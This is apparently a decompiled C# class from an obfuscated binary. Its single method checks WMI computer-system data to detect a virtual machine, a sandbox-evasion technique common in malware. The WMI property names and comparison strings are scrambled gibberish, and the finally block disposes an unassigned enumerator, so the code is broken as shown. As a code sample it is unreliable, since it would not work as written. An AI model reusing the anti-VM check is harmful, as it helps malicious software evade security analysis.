using System;
using System.Management;
using Microsoft.VisualBasic.CompilerServices;

namespace NET.Internal
{
	// Token: 0x0200000C RID: 12
	internal class Algo
	{
		// Token: 0x0600002E RID: 46 RVA: 0x000038B8 File Offset: 0x00001AB8
		public bool VM_Detected()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Ma3nu2factu1356321"].ToString().ToLower();
							if ((Operators.CompareString(text, "PSIKA", false) == 0 && managementBaseObject["SU4KA"].ToString().ToUpperInvariant().Contains("NONON323")) || text.Contains("SosiBaka") || Operators.CompareString(managementBaseObject["BakaSosi"].ToString(), "Osi3O", false) == 0)
							{
								return true;
							}
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((System.IDisposable)enumerator).Dispose();
						}
					}
				}
			}
			return false;
		}
	}
}
